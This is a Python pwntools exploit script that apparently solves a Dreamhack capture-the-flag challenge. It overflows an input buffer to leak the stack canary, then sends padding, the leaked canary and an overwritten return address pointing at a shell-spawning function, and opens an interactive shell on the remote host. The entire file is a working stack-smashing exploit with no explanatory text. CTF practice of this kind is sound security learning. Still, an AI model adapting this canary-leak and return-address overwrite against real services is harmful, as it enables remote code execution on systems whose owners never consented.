from pwn import *

HOST, PORT = '0.0.0.0', 31338
HOST, PORT = 'host3.dreamhack.games', 13945
r = remote(HOST, PORT)

sh=0x400a4a

def create_thread():
    r.sendlineafter(b'> ', b'1')

def input(size, data):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b': ', str(size).encode())
    r.sendlineafter(b': ', data)

def exit(data):
    r.sendlineafter(b'> ' , b'3')
    r.sendlineafter(b': ', data)

create_thread()
input(0x8e9, b'A'*0x8e9)

r.recvuntil(b'Data: ')
canary = u64(r.recvuntil(b'1.').strip(b'A').strip(b'1.')[:7].ljust(8, b'\x00')) << 8

exit(b'A'*40 + p64(canary) + p64(0) + p64(sh))

r.interactive()